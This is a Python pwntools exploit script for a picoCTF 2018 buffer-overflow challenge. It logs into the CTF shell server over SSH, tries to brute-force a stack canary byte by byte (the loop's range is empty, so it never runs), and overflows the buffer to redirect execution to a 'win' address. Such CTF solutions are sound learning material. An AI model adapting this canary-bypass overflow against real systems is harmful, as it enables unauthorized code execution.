from pwn import *

import string

s = ssh(host = '2018shell3.picoCTF.com', user='kruzXavier')
s.set_working_directory('/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce')

alphabet = string.printable

canary = ''  #canary : h?_=
for i in xrange(37, 37, 1):
	for ch in alphabet:
		payload = 'a'*32 + canary + ch
		r = s.process('./vuln')
		r.recvuntil('> ')
		r.sendline(str(i))
		r.recvuntil('> ')
		r.sendline(payload)

		output = r.recvall()
		if 'Ok' in output:
			canary += ch
			print 'canary = ', canary
			break

win_addr = 0x080486eb
payload = 'a'*32 + canary + 'a'*(0x30-32-0x4+0x4) + p32(win_addr)  # 0x30: [ebp-0x30], 32: a, 0x4: canary, 0x4:ebp
r = s.process('./vuln')
r.recvuntil('> ')
r.sendline('10000')
r.recvuntil('> ')
r.sendline(payload)
r.interactive()

